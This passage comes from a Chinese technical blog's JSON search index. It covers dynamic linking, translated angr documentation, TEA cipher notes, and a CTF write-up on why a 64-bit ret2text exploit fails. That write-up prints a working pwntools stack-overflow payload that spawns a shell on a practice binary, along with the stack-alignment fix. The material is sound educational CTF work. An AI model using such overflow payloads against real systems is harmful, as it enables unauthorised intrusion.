","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:5","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"动态链接 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:0","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"共享库文件 是一种特殊的可重定向目标文件，linux系统中使用.so后缀，windows系统中使用.dll后缀。动态链接中使用的库文件。在程序鱼形过程中，能被加载到内存的任意地址，还能与一个内存中的程序链接起来。 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:1","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"构造共享库 gcc --shared -fpic -o libmain.so main.c # fpic：生成位置无关代码 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:2","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"使用指定共享库链接 gcc -o main main.c ./libmain.so 链接器此时并未将libmin.so中的代码和数据复制到可执行文件中，只是复制了一些符号表和重定位信息 当main程序被加载运行时，加载器会发现可执行程序中存在一个名为.interp的节，这个节中包含了动态链接器的路径名，实际上这个连接器也是一个共享目标文件（ld-linux.so）。接下来，加载器会将这个动态链接器加载到内存中运行，然后由动态链接器执行重定位代码和数据的工作。 重定位之后，动态链接器把控制权限交给可执行程序。从这以后，共享库的位置就固定了，在程序执行过程中都不会改变 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:3","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"在运行时加载共享库 linux系统为动态链接器提供了接口，可以使程序在运行时加载和链接共享库，可使用dlopen、dlsym函数加载，使用dlclose函数卸载。这里不细说了。 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:4:4","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Angr"],"content":"README angr是一个多架构二进制分析工具包，能够实现对二进制程序的动态符号执行（像Mayhem, KLEE, 等等）和各种静态分析。如果你想要学习如何使用angr, 那么你就来对地方了。 我们努力使您更加轻松地使用angr——我们的目标是创造一个对使用者友好的二进制分析套件，让用户简单地使用ipython运行一些指令，就能分析密密麻麻的二进制程序。话虽如此，但二进制分析是十分复杂的，angr也不得不显得复杂。本文档将努力帮你走出困境，为你提供一些angr设计原则的解释和可能的探索 要进行二进制分析，我们必须解决以下问题： 将二进制程序转换为中间语言（intermediate representation） 执行确切的分析，可能的步骤有： 部分或完整程序的静态分析（如依赖分析、程序切片分析等） 对程序执行状态的符号化探索（如“我们可以执行程序直到找到溢出点吗？”） 上面两者的结合（如“让我们只执行程序写入内存的片段，去找到一个溢出点”） angr的组件可以应对以上所有的问题。这本手册将会解释每一个组件是如何工作的，以及如何使用他们来达成你的目标 ","date":"2022-09-05","objectID":"/2022/09/readme/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（一）README","uri":"/2022/09/readme/"},{"categories":["Angr"],"content":"Top Level Interface ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:0:0","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"开始之前（Before You Start） 我们预期的angr主要的应用场景是Ipython（或者其他python命令行解释器）。当你不确定可以用什么接口时，tab键的 补全往往能帮助到你。 有时Ipython中的tab补全会很慢。我们发现以下解决方法很有效且不会影响补全功能的完整性： # 将此文件放在Ipython配置文件的启动目录中可以避免每次都单独1运行它 import IPython py = IPython.get_ipython() py.Completer.use_jedi = False ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:1:0","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"核心概念（Core Concepts） 在开始使用angr之前，你将会对angr的基本概念和如何构造一个angr对象有一个基本的概览。我们将通过二进制程序加载后直接可用的接口来说明这些概念。 你使用angr做的第一件事往往是把二进制程序加载到工程中，我们以/bin/true为例 \u003e\u003e\u003e import angr \u003e\u003e\u003e proj = angr.Project('/bin/true') 在angr中，一个project是你所能控制的基本单元，通过project，你将能对刚刚加载的二进制程序进行分析和模拟。几乎你在angr项目中使用的每一个对象都依赖于某种形式的project而存在 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"基本属性（Basic properties） 首先，project有一些基本属性：它的CPU架构，它的文件名和程序入口点。 \u003e\u003e\u003e import monkeyhex # 用来将数字结果转化为16进制 \u003e\u003e\u003e proj.arch \u003cArch AMD64(LE)\u003e \u003e\u003e\u003e proj.entry 0x401670 \u003e\u003e\u003e proj.filename '/bin/true' arch是archinfo.Arch对象的实例，用来指明程序编译的架构，在这个例子中是little-endian amd64。它包含许多它所运行的CPU的信息，你可以在闲暇时细读。通常情况下你所关心的是arch.bits，arch.bytes（这个是main Arch class 的@property声明），arch.name和arch.memory_endness entrry是二进制程序的入口点 filename显然是二进制程序的文件名 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:1","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"加载器（The loader） 从一个二进制程序到它在虚拟地址空间的映射是十分复杂的！我们有一个叫CLE(Christophe’s Loader for Everything) 的模块去解决这个问题。CLE就是一种加载器，可以通过.loader属性调用。我们将在后面详细了解如何使用它，但现在你只需知道你可以用它查看angr随着你的程序加载的动态链接库（shared libraries）并且执行一些对于他们地址空间的基本的查询 \u003e\u003e\u003e proj.loader \u003cloaded true, maps [0x400000:0x5004000]\u003e \u003e\u003e\u003e proj.loader.shared_objects # 或许和你的看起来有点不一样 {'ld-linux-x86-64.so.2': \u003cELF Object ld-2.24.so, maps [0x2000000:0x2227167]\u003e, 'libc.so.6': \u003cELF Object libc-2.24.so, maps [0x1000000:0x13c699f]\u003e} \u003e\u003e\u003e proj.loader.min_addr 0x400000 \u003e\u003e\u003e proj.loader.max_addr 0x5004000 \u003e\u003e\u003e proj.loader.main_object # 我们已经在项目中加载了几个二进制程序。这里是主要的一个 \u003cELF Object true, maps [0x400000:0x60721f]\u003e \u003e\u003e\u003e proj.loader.main_object.execstack # 查询示例：是否存在可执行栈段 False \u003e\u003e\u003e proj.loader.main_object.pic # 查询示例：这个二进制程序是地址无关代码吗？ # pic(position-independent code)指可在主存储器中任意位置正确执行，而不受其绝对地址影响的一种机器码，常用于动态链接库 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:2","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"工厂（The Factory） 在angr中有许多类，而它们中的大多数需要一个project去把他们实例化。我们并不会让你到处传递project，而是提供了project.factory，其中包含了一些你会频繁使用到的、常见对象的构造器。 本节还将介绍angr的一些基本概念。 块（Blocks） 首先，我们有project.factory.block()，常常用来从给定地址提取基本代码块。这是一个重要的事实——angr以块为基本单位分析代码。你会得到一个block对象，其中包含了许多关于这个代码块的有趣的东西 \u003e\u003e\u003e block = proj.factory.block(proj.entry) # 从程序的入口点取出一个代码块 \u003cBlock for 0x401670, 42 bytes\u003e \u003e\u003e\u003e block.pp() # pretty-print 向stdout输出相应反汇编代码 0x401670: xor ebp, ebp 0x401672: mov r9, rdx 0x401675: pop rsi 0x401676: mov rdx, rsp 0x401679: and rsp, 0xfffffffffffffff0 0x40167d: push rax 0x40167e: push rsp 0x40167f: lea r8, [rip + 0x2e2a] 0x401686: lea rcx, [rip + 0x2db3] 0x40168d: lea rdi, [rip - 0xd4] 0x401694: call qword ptr [rip + 0x205866] \u003e\u003e\u003e block.instructions # 在这个代码块中共有多少条指令？ 0xb \u003e\u003e\u003e block.instruction_addrs # 这个代码块中指令的地址分别是多少？ [0x401670, 0x401672, 0x401675, 0x401676, 0x401679, 0x40167d, 0x40167e, 0x40167f, 0x401686, 0x40168d, 0x401694] 更多的，你可以使用block对象获得块代码的其他表示形式 \u003e\u003e\u003e block.capstone # capstone disassembly \u003cCapstoneBlock for 0x401670\u003e \u003e\u003e\u003e block.vex # VEX IRSB (这是python内部地址，而不是程序内部地址) \u003cpyvex.block.IRSB at 0x7706330\u003e 状态（states） 关于angr的另一个事实是——project对象仅仅相当于程序的一个“初始化镜像”。当你使用angr执行运行程序时，你正在使用一个模拟程序运行状态的对象-SimState。比如： \u003e\u003e\u003e state = proj.factory.entry_state() \u003cSimState @ 0x401670\u003e 一个SimState记录着一个程序的内存、寄存器、文件信息…任何可以通过程序执行更改的“实时数据”健康都会被存储进去。稍后我们将会介绍如何与这些状态交互，但是现在，让我们用state.regs和state.mem来查看当前状态下的寄存器和内存 \u003e\u003e\u003e state.regs.rip # 取得当前指令的地址 \u003cBV64 0x401670\u003e \u003e\u003e\u003e state.regs.rax \u003cBV64 0x1c\u003e \u003e\u003e\u003e state.mem[proj.etry].int.resolved # 将入口点的内存以C语言中int类型显示 \u003cBV32 0x8949ed31\u003e 这些并不是python的ints！这些是bitvectors。python中的integers与CPU层面的字（words）并不是一个概念，例如python不会产生整数溢出。所以我们使用bitvectors，可以将其视为一串bits构成的整数，angr中用它来代表CPU data。注意每个bitvector都有一个.length属性来描述它是多少bits宽 我们在后面将会学习如何使用它们，但是现在，我们列出了如何将数字在python int和bitvector之间转换的方法 \u003e\u003e\u003e bv = state.solver.BVV(0x1234, 32) # 创建一个32bit宽的bitvector,它的值是0x1234 \u003cBV32 0x1234\u003e # BVV：bitvector value \u003e\u003e\u003e state.solver.eval(bv) # 将bitvector转化为python int 0 你可以把bitvector存回寄存器和内存，或者直接存储python integer类型值，它会被自动转化成合适大小的bitvector \u003e\u003e\u003e state.regs.rsi = state.solver.BVV(3, 64) \u003e\u003e\u003e state.regs.rsi \u003cBV64 0x3\u003e \u003e\u003e\u003e state.mem[0x1000].long = 4 \u003e\u003e\u003e state.mem[0x1000].long.resolved \u003cBV64 0x4\u003e mem接口刚开始看令人困惑，因为它使用了一些强大的python魔法，下面是简要的使用指南： 使用array[index]来指明确定的地址 用.\u003ctype\u003e来指定内存数据的类型（常用类型：char, short, int, long, size_t, uint8_t, uint16_t…) 通过mem接口你可以： 存储一个值到内存，既可以是bitvector,也可以是python int 用.resolve来获取内存值并转化为bitvector 用.concrete来获取内存值并转化为python int 还有更多高级用法将在后面提到 最终，如果你尝试读取更多寄存器的值，你可能会遇到一个长得十分奇怪的值 \u003e\u003e\u003e state.regs.rdi \u003cBV64 reg_48_11_64{UNINITIALIZED}\u003e 这同样是一个64位bitvector，但是它并没有携带数值，相反的，它有一个名字！它被称为符号变量，也是符号执行的基础。不要恐慌！我们会在两章之后讨论它的细节 模拟管理器（Simulation Managers） 如果程序在任意给定的时间点都有一个状态，那么必然有一种方法可以让它变成下一种状态。simulation manager是angr执行中的主要接口。模拟（simulation）无论你如何叫它，它都是带有状态的。作为一个简短的介绍，让我们看看如何在我们之前创建的代码块中标记状态。 首先，我们要创建一个simulation manager，构造函数可以传入一个状态或状态列表 \u003e\u003e\u003e simgr = proj.factory.simulation_manager(state) \u003cSimulationManager with 1 active\u003e \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x401670\u003e] 一个simulation manager可以有多种状态的封装（stash），默认的stash是active，用我们传入的状态初始化。如果还不够的话，我们可以查看simgr.active[0]来进一步了解各种状态 现在， 准备好，我们要进行一些程序的执行了。 \u003e\u003e\u003e simgr.step() 我们刚刚进行了一个基本快的符号执行！ 我们可以再看看active stash，注意它已经被更新了，并且它并没有改变我们原来的状态。SimState对象在执行时被视为不可变，所以你可以安全地将单个状态作为多轮执行的开始（base） \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x1020300\u003e] \u003e\u003e\u003e simgr.active[0].regs.rip # new and exciting! \u003cBV64 0x1020300\u003e \u003e\u003e\u003e state.regs.rip # still the same! \u003cBV64 0x401670\u003e /bin/true不是一个很好的例子来描述如何用符号执行做有趣的事，所以我们现在就到此为止 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:3","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"分析（Analyse） angr预先打包了一些内置分析方法，你可以利用它们从程序中提取一些有趣的信息。 \u003e\u003e\u003e proj.analyses. # 在这里按tab来列出所有内置的分析方法 proj.analyses.BackwardSlice proj.analyses.CongruencyCheck proj.analyses.reload_analyses proj.analyses.BinaryOptimizer proj.analyses.DDG proj.analyses.StaticHooker proj.analyses.BinDiff proj.analyses.DFG proj.analyses.VariableRecovery proj.analyses.BoyScout proj.analyses.Disassembly proj.analyses.VariableRecoveryFast proj.analyses.CDG proj.analyses.GirlScout proj.analyses.Veritesting proj.analyses.CFG proj.analyses.Identifier proj.analyses.VFG proj.analyses.CFGEmulated proj.analyses.LoopFinder proj.analyses.VSA_DDG proj.analyses.CFGFast proj.analyses.Reassembler 本手册后面会记录其中的一些方法，但总的来说，如果你想要找到如何使用内置的分析方法，你应该查看api文档。作为一个简短的例子：下面说明了你应该怎样生成并使用一个快速的程序控制流图： # 刚开始时，当我们加载二进制文件时，它还将其所有依赖项加载到同一块虚拟内存中 # 这对于大多数分析是不愿意看到的 \u003e\u003e\u003e proj = angr.Project('/bin/true', auto_load_libs=False) \u003e\u003e\u003e cfg = proj.analyses.CFGFast() \u003cCFGFast Analysis Result at 0x2d85130\u003e # cfg.graph 是一个充满了CFGNode实例的 networkx DiGraph # 你应该去看 networkx APIs 的文档去学习如何使用它 \u003e\u003e\u003e cfg.graph \u003cnetworkx.classes.digraph.DiGraph at 0x2da43a0\u003e \u003e\u003e\u003e len(cfg.graph.nodes()) 951 # 去获取指定地址的 CFGNode， 可以用 cfg.get_any_node \u003e\u003e\u003e entry_node = cfg.get_any_node(proj.entry) \u003e\u003e\u003e len(list(cfg.graph.successors(entry_node))) 2 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:4","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"Now what？ 阅读完这一页之后，你应该熟悉了angr几个重要概念：basic blocks, states, bitvectors, simulation managers 和analyses。但是除了把angr作为美化的调试器以外，你还不能做任何事情。继续阅读，你将解锁更深层次的力量… ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:5","tags":["reverse","angr"],"title":"angr文档翻译（二）Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Binary"],"content":"起 以一道简单的pwn题说明，题目参见BUU-rip 查看保护信息，啥都没开，amd64 ❯ checksec ./pwn1 [*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 运行 ❯ ./pwn1 please input abc abc ok,bye!!! 拖入ida // main int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\"please input\"); gets((__int64)s, (__int64)argv); puts(s); puts(\"ok,bye!!!\"); return 0; } // backdoor int fun() { return system(\"/bin/sh\"); } // fun 汇编 .text:0000000000401186 fun proc near .text:0000000000401186 ; __unwind { .text:0000000000401186 push rbp .text:0000000000401187 mov rbp, rsp .text:000000000040118A lea rdi, command ; \"/bin/sh\" .text:0000000000401191 call _system ; Call Procedure .text:0000000000401196 nop ; No Operation .text:0000000000401197 pop rbp .text:0000000000401198 retn ; Return Near from Procedure .text:0000000000401198 ; } // starts at 401186 .text:0000000000401198 fun endp 所以解题思路就是通过main的gets函数进行栈溢出，覆盖返回地址，跳转到fun执行得到shell 由此得到exp from pwn import * context(log_level=\"debug\", arch=\"amd64\", os=\"linux\") p = process(\"./pwn1\") payload = b'a'*23 + p64(0x401186) p.sendlineafter(b\"please input\\n\",payload) p.interactive() 但是get shell失败 ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:1:0","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"承 于是去百度了一下，发现各种wp的payload中间多塞了一个地址0x401198，即payload = b'a'*23 + p64(0x401198) + p64(0x401186)，试了一下确实可行 文章原因说是为了恢复堆栈平衡，什么是堆栈平衡呢？ 我理解的是：在函数调用结束之后，将堆栈恢复到调用之前的样子，从汇编层面来说就是复原esp与ebp 但payload里加了0x401198这个地址只是多执行了一条retn，最多也只是让esp+4之类的，这就能控制堆栈平衡了？我百思不得其解 ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:2:0","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"转 拿gdb attach上去调发现了问题，跳转fun调用system函数时包括传参都是正常的，但会断在这一行汇编上 0x7fad5eadef43 movaps xmmword ptr [rsp + 0x50], xmm0 ; 报错 ; Program received signal SIGSEGV, Segmentation fault. 在执行glibc中的system系统调用时，很可能会用到movaps指令 movaps：在两个XMM寄存器或XMM寄存器与内存之间移动四个单精度浮点值。要求如果涉及内存，则内存地址必须按16字节对齐，即16进制表示的地址最后一位必须是0 此处可打印rsp+0x50发现确实不符合要求 pwndbg\u003e p $rsp+0x50 $1 = (void *) 0x7fffd26e4508 需要rsp+0x50按16字节对齐，更进一步来说，就是要rsp寄存器指向的地址按16字节对齐，而能够使rsp寄存器变化的无非call、retn、push、pop这些指令。 实际上，程序在正常运行情况下，编译器能保证编译出来的这些指令有序运作，当需要进行system调用时，一定是16字节对齐，使用movaps指令不会产生错误 只有程序堆栈被非正常地修改，程序进行非预期行为时，才可能会出现无法对齐的情况，从而引发Segmentation fault，使程序异常退出 再深入去想，由于是64位程序，所以rsp每次的变化要么是rsp-=8,要么是rsp+=8，故rsp所指地址最后一位其实只有两个取值，0或8，为0时堆栈对齐，为8时会引发错误 在进行ret2text时，我们覆盖了函数返回地址，程序本该返回至调用处，却进入了一个新的函数。 在此之前，rsp指向的地址一直是正常的，与程序正常执行无异的，但新函数第一句要执行压栈命令push rbp，此时rsp-=8，于是rsp最后一位变成了8，进行system调用时发生错误 那么如何避免错误呢？ 显而易见的，我们需要修改rsp寄存器的值，无论是加8还是减8，但同时必须合理利用返回地址才能进行跳转。于是，retn成为了一个很好的选择，我们可以提前布栈，先压入一个retn指令的地址，再压入后门函数的地址 程序首先执行retn指令即pop rip使rsp+8，此时紧随其后后门函数的地址赋值给rip，下一步进入后门函数，当执行push rbp时rsp-8，此时rsp最后一位变回0，程序正常执行 换一种思路？ 既然我们知道了是多了一句push rbp出了问题，那我们是不是可以跳过这一句呢？答案是肯定的，我们可以直接把返回地址改为system调用之前传参的地址，即payload = b'a'*23 + p64(0x40118A)，一样可以get shell ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:3:0","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"合 64位程序ret2text失败简单以没有平衡堆栈来解释是极不负责的做法 平衡堆栈是指在函数调用结束后，将堆栈恢复到原来的状态。 但我们在利用栈溢出漏洞进行攻击时，并不关心函数调用结束后的状态。只是需要在系统调用之前保证堆栈对齐即可 ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:4:0","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"Ref https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/ https://ropemporium.com/guide.html 以上，如有疏漏请师傅们指出 ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:5:0","tags":["pwn"],"title":"堆栈对齐——关于64位程序ret2text失败的溯源","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Crypto"],"content":"TEA ","date":"2022-07-29","objectID":"/2022/07/tea/:0:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"算法简介 TEA：微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。 块密码：在密码学中，分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。 ","date":"2022-07-29","objectID":"/2022/07/tea/:1:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"算法属性 TEA操作处理两个32位无符号整型上（可能源于一个64位数据） TEA使用一个128位密钥 ","date":"2022-07-29","objectID":"/2022/07/tea/:2:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"算法过程 ","date":"2022-07-29","objectID":"/2022/07/tea/:3:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"- TEA遵循Feistel网络 Feistel网络构造细节： 令F为轮函数，并令$K_0,K_1,……K_n$分别为0,1,……n的子密钥 将明文拆分为两个等长的块，$(L_0,R_0)$ 对每轮$i=0,1……n$，计算 $L_{i+1}=R_i$ $R_{i+1}=L_i \\bigoplus F(R_i,K_i)$ 则密文为$(R_{n+1},L_{n+1})$ 加解密过程唯一区别是子密钥顺序反转 ","date":"2022-07-29","objectID":"/2022/07/tea/:3:1","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"- TEA实现过程 ","date":"2022-07-29","objectID":"/2022/07/tea/:3:2","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"C语言实现 #include \u003cstdint.h\u003e void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u003c 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); v1 += ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u003c32; i++) { /* basic cycle start */ v1 -= ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); v0 -= ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:4:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"逆向算法特征 delta的值0x9e3779b9，且有sum在每一轮逐次累加，但delta数值容易被魔改 加密轮次一般为32轮，且每轮加密都是对两个32位数据进行 \u003c\u003c4与\u003e\u003e5及其加密逻辑一般是最重要的突破口 ","date":"2022-07-29","objectID":"/2022/07/tea/:5:0","tags":["crypto"],"title":"逆向人学密码（二）TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"XTEA #include \u003cstdint.h\u003e /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { 